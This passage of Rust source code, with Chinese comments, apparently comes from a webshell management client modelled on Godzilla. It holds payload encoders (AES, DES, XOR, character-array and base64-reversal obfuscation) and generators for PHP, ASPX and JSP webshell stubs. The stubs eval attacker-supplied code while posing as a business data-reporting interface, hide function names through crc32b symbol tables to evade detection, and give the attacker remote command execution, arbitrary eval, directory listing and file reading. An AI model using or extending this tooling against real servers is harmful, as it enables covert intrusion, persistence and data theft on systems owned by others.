                "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System\" %>\n<%@ Import Namespace=\"Microsoft.CSharp\" %>\n<%@ Import Namespace=\"System.CodeDom.Compiler\" %>\n<script runat=\"server\">\nvoid Run(string code) {\n  CSharpCodeProvider p = new CSharpCodeProvider();\n  CompilerParameters prm = new CompilerParameters();\n  prm.GenerateInMemory = true;\n  CompilerResults res = p.CompileAssemblyFromSource(prm,\n    \"using System;public class T{public static object E(){\" + code + \"return null;}}\");\n  if (!res.Errors.HasErrors) {\n    object o = res.CompiledAssembly.CreateInstance(\"T\");\n    if (o != null) o.GetType().GetMethod(\"E\").Invoke(o, new object[]{});\n  }\n}\n</script>\n<% string x = Request[\"x\"]; if (x != null) { Run(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(x))); } %>\n".to_string(),
            ),
            "jsp" => Ok(
                "<%@ page contentType=\"text/html;charset=UTF-8\" %>\n<%\nString x = request.getParameter(\"x\");\nif (x != null) {\n  byte[] b = java.util.Base64.getDecoder().decode(x);\n  try {\n    new javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(new String(b, \"UTF-8\"));\n  } catch (Exception e) {}\n}\n%>\n".to_string(),
            ),
            other => Err(ProtocolError::NotSupported(format!(
                "BASE64 编码器不支持语言：{other}"
            ))),
        }
    }
    fn stub_session(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(session_php_stub(
                &[(0, "base64_decode"), (1, "base64_encode")],
                "    $out = $_g[0]($payload);",
                "    $out = $_g[1]($data);",
                "",
                "",
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "该编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// 密钥派生（与 PHP openssl 侧完全一致）
// ---------------------------------------------------------------------------

/// AES-256 密钥：md5_hex 全部 32 字符（32 字节 ASCII，与 CHACHA20 密钥派生一致）。
pub fn aes_key(password: &str) -> [u8; 32] {
    md5_hex(password)
        .as_bytes()
        .try_into()
        .expect("md5 hex 长度足够")
}

/// AES-CBC IV：md5_hex 后 16 字符。
pub fn aes_iv(password: &str) -> [u8; 16] {
    let hex = md5_hex(password);
    hex.as_bytes()[16..].try_into().expect("md5 hex 长度足够")
}

/// DES 密钥：md5_hex 前 8 字符。
pub fn des_key(password: &str) -> [u8; 8] {
    let hex = md5_hex(password);
    hex.as_bytes()[..8].try_into().expect("md5 hex 长度足够")
}

/// 真正的 AES-128-ECB 加密：逐块独立加密 + PKCS7 填充。
/// 注意：CBC 零 IV 不是 ECB（CBC 有链式依赖），与 PHP openssl_encrypt('AES-128-ECB') 不互操作。
pub fn aes_ecb_encrypt(plain: &[u8], key: &[u8; 32]) -> Vec<u8> {
    use aes::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
    let cipher = aes::Aes256::new(key.into());
    let mut padded = plain.to_vec();
    let pad = 16 - (plain.len() % 16);
    padded.extend(std::iter::repeat_n(pad as u8, pad));
    let mut out = Vec::with_capacity(padded.len());
    for chunk in padded.chunks(16) {
        let mut block = GenericArray::clone_from_slice(chunk);
        cipher.encrypt_block(&mut block);
        out.extend_from_slice(&block);
    }
    out
}

pub fn aes_ecb_decrypt(cipher: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, ProtocolError> {
    use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
    if cipher.is_empty() || !cipher.len().is_multiple_of(16) {
        return Err(ProtocolError::ParseError(
            "AES-ECB 密文长度异常".to_string(),
        ));
    }
    let dec = aes::Aes256::new(key.into());
    let mut out = Vec::with_capacity(cipher.len());
    for chunk in cipher.chunks(16) {
        let mut block = GenericArray::clone_from_slice(chunk);
        dec.decrypt_block(&mut block);
        out.extend_from_slice(&block);
    }
    // PKCS7 去填充
    if let Some(&last) = out.last() {
        let pad = last as usize;
        if pad > 0
            && pad <= 16
            && out.len() >= pad
            && out[out.len() - pad..].iter().all(|&b| b == last)
        {
            out.truncate(out.len() - pad);
            Ok(out)
        } else {
            Err(ProtocolError::ParseError(
                "AES-ECB 填充校验失败".to_string(),
            ))
        }
    } else {
        Err(ProtocolError::ParseError("AES-ECB 密文为空".to_string()))
    }
}

pub fn aes_cbc_encrypt(plain: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    use aes::cipher::generic_array::GenericArray;
    AesCbcEnc::new(GenericArray::from_slice(key), GenericArray::from_slice(iv))
        .encrypt_padded_vec_mut::<Pkcs7>(plain)
}

pub fn aes_cbc_decrypt(
    cipher: &[u8],
    key: &[u8; 32],
    iv: &[u8; 16],
) -> Result<Vec<u8>, ProtocolError> {
    use aes::cipher::generic_array::GenericArray;
    AesCbcDec::new(GenericArray::from_slice(key), GenericArray::from_slice(iv))
        .decrypt_padded_vec_mut::<Pkcs7>(cipher)
        .map_err(|_| ProtocolError::ParseError("AES-CBC 解密失败".to_string()))
}

/// 真正的 DES-ECB 加密（逐块 + PKCS7）。
pub fn des_ecb_encrypt(plain: &[u8], key: &[u8; 8]) -> Vec<u8> {
    use des::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
    let cipher = des::Des::new(key.into());
    let mut padded = plain.to_vec();
    let pad = 8 - (plain.len() % 8);
    padded.extend(std::iter::repeat_n(pad as u8, pad));
    let mut out = Vec::with_capacity(padded.len());
    for chunk in padded.chunks(8) {
        let mut block = GenericArray::clone_from_slice(chunk);
        cipher.encrypt_block(&mut block);
        out.extend_from_slice(&block);
    }
    out
}

pub fn des_ecb_decrypt(cipher: &[u8], key: &[u8; 8]) -> Result<Vec<u8>, ProtocolError> {
    use des::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
    if cipher.is_empty() || !cipher.len().is_multiple_of(8) {
        return Err(ProtocolError::ParseError(
            "DES-ECB 密文长度异常".to_string(),
        ));
    }
    let dec = des::Des::new(key.into());
    let mut out = Vec::with_capacity(cipher.len());
    for chunk in cipher.chunks(8) {
        let mut block = GenericArray::clone_from_slice(chunk);
        dec.decrypt_block(&mut block);
        out.extend_from_slice(&block);
    }
    if let Some(&last) = out.last() {
        let pad = last as usize;
        if pad > 0
            && pad <= 8
            && out.len() >= pad
            && out[out.len() - pad..].iter().all(|&b| b == last)
        {
            out.truncate(out.len() - pad);
            Ok(out)
        } else {
            Err(ProtocolError::ParseError(
                "DES-ECB 填充校验失败".to_string(),
            ))
        }
    } else {
        Err(ProtocolError::ParseError("DES-ECB 密文为空".to_string()))
    }
}

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------
// DES-ECB（自加密，密钥 md5 前 8 字符）
// ---------------------------------------------------------------------------

pub struct DesEcbEncoder;

impl PayloadEncoder for DesEcbEncoder {
    fn id(&self) -> &'static str {
        "des"
    }

    fn display_name(&self) -> &'static str {
        "DES_ECB（DES 加密 + Base64，自加密）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let cipher = des_ecb_encrypt(code.as_bytes(), &des_key(password));
        base64::engine::general_purpose::STANDARD.encode(cipher)
    }
    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
        let raw = base64::engine::general_purpose::STANDARD
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
        des_ecb_decrypt(&raw, &des_key(password))
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => {
                let xk = php_ident();
                let unpack = format!(
                    "    $key = substr(md5($token), 0, 8);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key);",
                    cipher = xor_hex("DES-ECB", &xk),
                );
                Ok(business_php_stub(
                    &[(0, "openssl_decrypt")],
                    &unpack,
                    "        __EVAL__($script);",
                ))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "DES_ECB 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => {
                let xk = php_ident();
                let ck = php_ident();
                let key_enc = xor_hex(&md5_hex(password)[..8], &xk);
                let unpack = format!(
                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[0]($payload, __PREFIX__dec('{cipher}', '{ck}'), $key);",
                    key = key_enc,
                    xk = xk,
                    cipher = xor_hex("DES-ECB", &ck),
                    ck = ck,
                );
                let pack = format!(
                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[1]($data, __PREFIX__dec('{cipher}', '{ck}'), $key);",
                    key = key_enc,
                    xk = xk,
                    cipher = xor_hex("DES-ECB", &ck),
                    ck = ck,
                );
                Ok(session_php_stub(
                    &[(0, "openssl_decrypt"), (1, "openssl_encrypt")],
                    &unpack,
                    &pack,
                    "",
                    "",
                ))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "该编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// CHAR：载荷为 chr() 数组拼接的混淆代码（stub 为裸 eval，混淆在载荷内）
// ---------------------------------------------------------------------------

pub struct CharEncoder;

impl PayloadEncoder for CharEncoder {
    fn id(&self) -> &'static str {
        "char"
    }

    fn display_name(&self) -> &'static str {
        "CHAR（字符数组混淆，无密钥）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        let bytes = code.as_bytes();
        let values: Vec<String> = bytes.iter().map(|byte| byte.to_string()).collect();
        format!(
            "{} (implode('',array_map('chr',array({}))));",
            eval_prefix(),
            values.join(",")
        )
    }
    fn decode(&self, payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
        Ok(char_decode(payload)?.into_bytes())
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(business_php_stub(
                &[],
                "    $out = $payload;",
                "        __EVAL__($script);",
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "CHAR 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
    fn stub_session(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(session_php_stub(
                &[],
                "    preg_match_all('/\\d+/', $payload, $m);\n    $out = implode('', array_map('chr', array_map('intval', $m[0])));",
                "    $out = \"implode('',array_map('chr',array(\" . implode(',', array_map('ord', str_split($data))) . \")));\";",
                "",
                "",
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "该编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

/// 从 CHAR 载荷还原原始代码（测试 / mock 用）。
pub fn char_decode(payload: &str) -> Result<String, ProtocolError> {
    let numbers = payload
        .split("array(")
        .nth(1)
        .and_then(|part| part.split(')').next())
        .ok_or_else(|| ProtocolError::ParseError("CHAR 载荷格式异常".to_string()))?;
    let bytes: Vec<u8> = numbers
        .split(',')
        .filter_map(|item| item.trim().parse::<u8>().ok())
        .collect();
    String::from_utf8(bytes).map_err(|_| ProtocolError::ParseError("CHAR 载荷解码失败".to_string()))
}

// ---------------------------------------------------------------------------
// PHP_OBFUSCATE：base64 + 反转混淆（载荷自带解码，stub 为裸 eval）
// ---------------------------------------------------------------------------

pub struct PhpObfuscateEncoder;

impl PayloadEncoder for PhpObfuscateEncoder {
    fn id(&self) -> &'static str {
        "php_obfuscate"
    }

    fn display_name(&self) -> &'static str {
        "PHP_OBFUSCATE（base64+反转混淆，无密钥）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        let b64 = base64::engine::general_purpose::STANDARD.encode(code.as_bytes());
        let reversed: String = b64.chars().rev().collect();
        let decode_call = call_parts("base64_decode", &format!("strrev('{reversed}')"));
        format!("{} ({decode_call});", eval_prefix())
    }
    fn decode(&self, payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
        Ok(obfuscate_decode(payload)?.into_bytes())
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(business_php_stub(
                &[],
                "    $out = $payload;",
                "        __EVAL__($script);",
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "PHP_OBFUSCATE 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
    fn stub_session(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(session_php_stub(
                &[(0, "base64_decode"), (1, "base64_encode")],
                "    $p = substr($payload, strpos($payload, \"strrev('\") + 8);\n    $p = substr($p, 0, strpos($p, \"')\"));\n    $out = $_g[0](strrev($p));",
                "    $out = \"strrev('\" . strrev($_g[1]($data)) . \"')\";",
                "",
                "",
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "该编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

/// 从 OBFUSCATE 载荷还原原始代码（测试 / mock 用）。
pub fn obfuscate_decode(payload: &str) -> Result<String, ProtocolError> {
    let reversed = payload
        .split("strrev('")
        .nth(1)
        .and_then(|part| part.split("')").next())
        .ok_or_else(|| ProtocolError::ParseError("OBFUSCATE 载荷格式异常".to_string()))?;
    let b64: String = reversed.chars().rev().collect();
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(&b64)
        .map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))?;
    String::from_utf8(bytes)
        .map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))
}

// ---------------------------------------------------------------------------
// PHP_STREAM：零敏感函数编码器（极简 stub）。
//
// stub 只有一行 `INCLUDE("php://filter/read=convert.base64-decode/resource=php://input")`：
//   - 不出现 eval / assert / base64_decode / $_POST 等任何敏感函数
//   - 载荷经请求体直传（body 模式），stub 通过 php://filter 链 base64 解码后
//     include 执行，解码逻辑完全由 PHP 流包装器完成
// 注意：需要目标 PHP 开启 allow_url_include=On（部分虚拟主机默认开启）。
// 若环境未开启，请改用其他编码器（xor/aes 等，stub 含混淆后的 EvAl）。
// ---------------------------------------------------------------------------

pub struct PhpStreamEncoder;

impl PayloadEncoder for PhpStreamEncoder {
    fn id(&self) -> &'static str {
        "php_stream"
    }

    fn display_name(&self) -> &'static str {
        "PHP_STREAM（零敏感函数 stub，需 allow_url_include=On）"
    }

    fn body_mode(&self) -> bool {
        true
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        // 完整 PHP 源码（含标签），stub include 后直接执行
        let source = format!("<?php\n{code}");
        base64::engine::general_purpose::STANDARD.encode(source.as_bytes())
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok("<?php\nINCLUDE(\"php://filter/read=convert.base64-decode/resource=php://input\");\n".to_string()),
            other => Err(ProtocolError::NotSupported(format!(
                "PHP_STREAM 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

/// 从 PHP_STREAM 载荷还原原始代码（测试 / mock 用）。
pub fn php_stream_decode(payload: &str) -> Result<String, ProtocolError> {
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(payload)
        .map_err(|_| ProtocolError::ParseError("PHP_STREAM 载荷解码失败".to_string()))?;
    String::from_utf8(bytes)
        .map(|source| {
            source
                .trim_start_matches("<?php")
                .trim_start_matches("\n")
                .to_string()
        })
        .map_err(|_| ProtocolError::ParseError("PHP_STREAM 载荷解码失败".to_string()))
}

// ---------------------------------------------------------------------------
// XOR_BODY：Godzilla 风格请求体直传编码器。
//
// 与 php_stream 不同：stub 用 `file_get_contents('php://input')` 读请求体，
// **不需要 allow_url_include**（默认配置即可用）。请求体为 XOR+Base64 密文，
// 无表单参数（无 $_POST 特征）。密钥由密码 md5 派生并以 XOR 十六进制嵌入
// stub（经 dec 函数运行时还原，不出现明文密钥）。
// ---------------------------------------------------------------------------

pub struct XorBodyEncoder;

impl PayloadEncoder for XorBodyEncoder {
    fn id(&self) -> &'static str {
        "xor_body"
    }

    fn display_name(&self) -> &'static str {
        "XOR_BODY（请求体 XOR 直传，Godzilla 风格，默认配置可用）"
    }

    fn body_mode(&self) -> bool {
        true
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let key = md5_hex(password).into_bytes();
        let xored: Vec<u8> = code
            .as_bytes()
            .iter()
            .enumerate()
            .map(|(index, byte)| byte ^ key[index % key.len()])
            .collect();
        base64::engine::general_purpose::STANDARD.encode(xored)
    }
    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
        let raw = base64::engine::general_purpose::STANDARD
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
        let key = md5_hex(password).into_bytes();
        Ok(raw
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect())
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => {
                let key_hex = md5_hex(password);
                let xk = php_ident();
                // 密钥以 XOR 十六进制嵌入，dec 函数运行时还原
                let key_enc = xor_hex(&key_hex, &xk);
                // 业务伪装：数据上报接口（接收 base64 压缩数据 -> 解压 -> 规则引擎）
                let body_tpl = r#"<?php
// 用户会话数据上报接口（返回 JSON）
// 业务：接收客户端上报的压缩会话数据 -> 解压 -> 规则引擎处理 -> 返回状态
header('Content-Type: application/json');

// 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表）
$_g = array();
$_t = array(
    '9ff5d542' => 0,
    '2693a743' => 2,
);
$_fn = get_defined_functions();
$_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
foreach ($_fn as $_n) {
    $_h = hash('crc32b', $_n);
    if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
}
// 注意：这里**不能**写「执行器降级」覆盖 $_g[0] —— 本 stub 的 $_g[0]
// 是 base64_decode（解包用），覆盖后解包会去调用 shell_exec(密文) 并返回空，
// 表现为客户端报「响应中未找到协议帧」。命令函数降级链由发送的代码自行探测
// （php_impl::PHP_EXEC_IMPL），不依赖 stub 预置。

function __PREFIX__dec($hex, $key) {
    $out = '';
    $n = strlen($hex) / 2;
    for ($i = 0; $i < $n; $i++) {
        $out .= chr(hexdec(substr($hex, $i * 2, 2)) ^ ord($key[$i % strlen($key)]));
    }

    return $out;
}

function __PREFIX__unpack_session($payload) {
    global $_g;
    $raw = $_g[0]($payload);
    $key = __PREFIX__dec('{KEYENC}', '{XK}');
    $out = '';
    $n = strlen($raw);
    for ($i = 0; $i < $n; $i++) { $out .= $raw[$i] ^ $key[$i % strlen($key)]; }
    return $out;
}

function __PREFIX__run_rule($script) {
    // 规则脚本引擎：客户端提交的自动化规则在沙箱内执行
    $result = array('code' => 200, 'rule_size' => strlen($script));
    if ($script !== '' && strlen($script) < 1048576) {
        $buf = $script;
        __EVAL__($buf);
    }
    return $result;
}

$i = "php:" . "//input";
$payload = @$_g[2]($i);
if ($payload === false || $payload === '') {
    die('{"code":400,"msg":"empty_payload"}');
}
$script = __PREFIX__unpack_session($payload);
echo json_encode(__PREFIX__run_rule($script));
"#;
                let prefix = format!("_{}_", php_ident());
                Ok(body_tpl
                    .replace("__PREFIX__", &prefix)
                    .replace("__EVAL__", &eval_prefix())
                    .replace("{KEYENC}", &key_enc)
                    .replace("{XK}", &xk))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "XOR_BODY 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => {
                let key_hex = md5_hex(password);
                let xk = php_ident();
                let key_enc = xor_hex(&key_hex, &xk);
                let unpack = format!(
                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = __PREFIX__x($_g[0]($payload), $key);",
                    key = key_enc,
                    xk = xk,
                );
                let pack = format!(
                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[1](__PREFIX__x($data, $key));",
                    key = key_enc,
                    xk = xk,
                );
                Ok(session_php_stub(
                    &[(0, "base64_decode"), (1, "base64_encode")],
                    &unpack,
                    &pack,
                    "",
                    "",
                ))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "该编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// XOR_SESSION：Godzilla 分阶段载荷编码器。
//
// 核心机制（Godzilla PHP shell 同款）：
//   1. 首次（初始化）请求：客户端发送完整「处理器代码」（含 INIT 标记），
//      stub 解密后存入 session（再加密存储），返回加密的 "ok"
//   2. 后续请求：客户端只发送「参数 JSON」（操作名 + 参数），stub 从 session
//      取处理器代码 eval（定义 run()），调用 run($params) 并加密返回结果
//   3. 载荷（功能代码）只传输一次，之后每次请求只有小体积参数
//   4. 请求体 / 响应体全程 XOR 加密（key 由密码 md5 派生，以 XOR 十六进制
//      嵌入 stub，dec 函数运行时还原）；无表单参数、无需 allow_url_include
// ---------------------------------------------------------------------------

/// Godzilla 初始化标记（处理器代码中必须包含，stub 据此识别初始化请求）。
pub const SESSION_INIT_MARK: &str = "DswSesInit";

/// Godzilla 分阶段载荷（session 模式）的统一 stub 骨架。
/// 处理器代码一次注入服务端 session，后续请求只传参数；请求/响应全程加密。
/// 占位符：__PREFIX__（随机前缀）、__SYMBOLS__（crc32b 符号表）、
/// __UNPACK__（请求体解密）、__PACK__（响应加密）。
const SESSION_STUB_TPL: &str = r#"<?php
// 用户会话数据上报接口（返回 JSON）
// 业务：按会话维护客户端上报的压缩规则脚本，每次上报执行规则并返回状态
@session_start();
header('Content-Type: application/json');

// 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表）
$_g = array();
$_t = array(
__SYMBOLS__);
$_fn = get_defined_functions();
$_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
foreach ($_fn as $_n) {
    $_h = hash('crc32b', $_n);
    if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
}
// 注意：不要在此覆盖 $_g[0]。session 模板的 unpack/pack 由各编码器通过
// 符号表把 $_g[0]/$_g[1] 绑定为各自需要的解码 / 加解密函数；
// 早期这里有一段「执行器降级」会把 $_g[0] 改成命令函数，导致解包时
// 实际把密文当命令执行并返回空 —— 7 个 session 编码器因此全部不可用。
// 处理器 run() 内部直接用命令函数，不需要这份降级。
function __PREFIX__dec($hex, $key) {
    $out = '';
    $n = strlen($hex) / 2;
    for ($i = 0; $i < $n; $i++) {
        $out .= chr(hexdec(substr($hex, $i * 2, 2)) ^ ord($key[$i % strlen($key)]));
    }
    return $out;
}

function __PREFIX__x($d, $k) {
    $out = '';
    $n = strlen($d);
    for ($i = 0; $i < $n; $i++) { $out .= $d[$i] ^ $k[$i % strlen($k)]; }
    return $out;
}

__ALGO__

function __PREFIX__unpack($payload) {
    global $_g;
__UNPACK__
    return $out;
}

function __PREFIX__pack($data) {
    global $_g;
__PACK__
    return $out;
}

function __PREFIX__store($data) {
    global $_g;
__STORE__
    return $out;
}

function __PREFIX__run_rule($script) {
    // 规则引擎：执行客户端提交的自动化规则（沙箱）
    $buf = $script;
    __EVAL__($buf);
}

$i = "php:" . "//input";
$payload = @$_g[2]($i);
if ($payload === false || $payload === '') {
    die('{"code":400,"msg":"empty_payload"}');
}
$data = __PREFIX__unpack($payload);
if (isset($_SESSION['__PREFIX__p'])) {
    if (strpos($data, 'DswSesInit') !== false) {
        echo __PREFIX__pack('ok');
    } else {
        $ses = $_SESSION;
        $c1 = $ses['__PREFIX__p'];
        $code = __PREFIX__unpack($c1);
        if (!function_exists('run')) { __PREFIX__run_rule($code); }
        echo __PREFIX__pack(run($data));
    }
} else {
    if (strpos($data, 'DswSesInit') !== false) {
        $_SESSION['__PREFIX__p'] = __PREFIX__store($data);
        echo __PREFIX__pack('ok');
    } else {
        echo __PREFIX__pack('no_init');
    }
}
"#;

/// 生成 Godzilla 分阶段载荷（session 模式）stub。
/// `symbols`：运行时符号表（索引 + 函数名，crc32b 查表）；
/// `unpack_body`：请求体解密逻辑（$payload -> $out）；
/// `pack_body`：响应加密逻辑（$data -> $out）。
pub fn session_php_stub(
    symbols: &[(usize, &str)],
    unpack_body: &str,
    pack_body: &str,
    algo_body: &str,
    store_body: &str,
) -> String {
    let prefix = format!("_{}_", php_ident());
    // unpack/pack 参数与算法代码中引用的 __PREFIX__（dec / x / 算法函数名）随前缀替换
    let unpack_body = unpack_body.replace("__PREFIX__", &prefix);
    let pack_body = pack_body.replace("__PREFIX__", &prefix);
    let algo_body = algo_body.replace("__PREFIX__", &prefix);
    // 会话内容存储默认用 pack（对称加解密编码器）；非对称流密码（chacha/rabbit）自行覆盖
    let store_body = if store_body.is_empty() {
        "    $out = __PREFIX__pack($data);"
            .to_string()
            .replace("__PREFIX__", &prefix)
    } else {
        store_body.replace("__PREFIX__", &prefix)
    };
    // 注入通用符号：file_get_contents（session 模板读请求体用，索引 2）
    let mut symbols: Vec<(usize, &str)> = symbols.to_vec();
    if !symbols.iter().any(|(index, _)| *index == 2) {
        symbols.push((2, "file_get_contents"));
    }
    let mut table = String::new();
    for (index, name) in symbols {
        table.push_str(&format!("    '{}' => {index},\n", crc32b_hash(name)));
    }
    SESSION_STUB_TPL
        .replace("__PREFIX__", &prefix)
        .replace("__SYMBOLS__", &table)
        .replace("__EVAL__", &eval_prefix())
        .replace("__UNPACK__", &unpack_body)
        .replace("__PACK__", &pack_body)
        .replace("__ALGO__", &algo_body)
        .replace("__STORE__", &store_body)
}

/// 处理器代码：一次传输后驻留服务端 session，定义 run($p) 处理全部操作。
/// 参数 JSON：{a: 操作名, n: nonce, ...}；返回 nonce 帧包裹的 JSON。
///
/// **版本前提**：处理器每次连接由客户端注入（`ensure_session_init`），所以它永远与
/// 客户端同版本 —— 通道能力（6 驱动数据库、命令降级链、gzip）不受目标上已部署
/// stub 版本影响。这正是本函数可以安全复用 [`crate::php_impl`] 片段的原因。
///
/// **gzip 在明文层**（`{"n":..,"z":1,"d":base64(gzip(内层 JSON))}`），与 NATIVE 的
/// 密文层 gzip 不同：密文是高频熵数据，压缩收益接近零；明文层能真正压缩
/// base64 载荷（上传/下载的分块，base64 膨胀 33% 可被收回）。响应同样在帧内
/// base64 **之前**压缩，客户端按 gzip 魔数识别。
static SESSION_HANDLER: std::sync::LazyLock<String> =
    std::sync::LazyLock::new(build_session_handler);

pub fn session_handler_code() -> &'static str {
    &SESSION_HANDLER
}

fn build_session_handler() -> String {
    use crate::php_impl;
    // 处理器经 eval 执行，不能包含 `<?php` 开标签。
    //
    // OPSEC：敏感函数名一律经**随代码自带**的 crc32b 符号表调用（见
    // `php_impl::php_symbol_table`）。表在这里构建而不是复用目标 stub 的 `$_g`：
    // 处理器每次连接由客户端注入，而部署在目标上的 stub 可能是旧版本、没有新索引。
    let sym = format!("{}g", php_ident());
    let mut code = String::from("// DswSesInit\n");
    code.push_str(php_impl::PHP_REDIS_HELPERS);
    code.push_str(&php_impl::php_symbol_table(&format!("$GLOBALS['{sym}']")));
    code.push_str(&format!(
        "function run($p) {{\n$__g =& $GLOBALS['{sym}'];\n"
    ));
    code.push_str(
        r#"$req=@json_decode($p,true);
$n=is_array($req)&&isset($req['n'])?(string)$req['n']:'abababab';
$gz=false;
if(is_array($req)&&isset($req['z'])){
$gz=true;
$__in=(isset($__g[23])&&isset($__g[5]))?@$__g[23](@$__g[5]((string)$req['d'])):false;
$req=is_string($__in)?@json_decode($__in,true):null;
}
if(!is_array($req)){return $n.(isset($__g[6])?@$__g[6]('{"ok":false,"error":"bad params"}'):'').$n;}
$n=isset($req['n'])?(string)$req['n']:$n;
$a=isset($req['a'])?(string)$req['a']:'';
$r=array('ok'=>true,'data'=>array());
if($a==='probe'){
"#,
    );
    code.push_str(php_impl::PHP_INFO_IMPL);
    code.push_str(
        r#"$r['data']=array('server'=>$info['OsInfo'],'web_server'=>$info['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>@getcwd(),'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>$info['ProcessArch'],'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>$info['disable_functions'],'info'=>$info);
}elseif($a==='exec'){
$c=isset($req['c'])?(string)$req['c']:'';$w=isset($req['w'])?(string)$req['w']:'';
"#,
    );
    code.push_str(php_impl::PHP_EXEC_IMPL);
    code.push_str(
        r#"if($ok){$r['data']=array('stdout'=>$stdout,'cwd'=>$cwd);}else{$r['ok']=false;$r['error']=$err;}
}elseif($a==='eval'){
$c=isset($req['c'])?(string)$req['c']:'';
if($c===''){$r['ok']=false;$r['error']='empty';}
else{
ob_start();
"#,
    );
    // eval 用大小写混合 + 随机注释分隔（`eVaL/*rvnd*/(...)`），代码中不存在 `eval(`
    code.push_str(&format!(
        r#"try{{@{p}($c);$r['data']=(string)ob_get_clean();}}
catch(Exception $__e){{$r['data']=(string)ob_get_clean();$r['ok']=false;$r['error']=$__e->getMessage();}}
catch(Throwable $__t){{$r['data']=(string)ob_get_clean();$r['ok']=false;$r['error']=$__t->getMessage();}}
}}
"#,
        p = eval_prefix()
    ));
    code.push_str(
        r#"}
elseif($a==='list'){
$p=isset($req['p'])?(string)$req['p']:'.';
"#,
    );
    code.push_str(php_impl::PHP_SCAN_IMPL);
    code.push_str(
        r#"if($ok){$r['data']=array('entries'=>$entries);}else{$r['ok']=false;$r['error']=$err;}
}elseif($a==='read'){
$f=isset($req['p'])?(string)$req['p']:'';$o=isset($req['o'])?(int)$req['o']:0;$l=isset($req['l'])?(int)$req['l']:0;
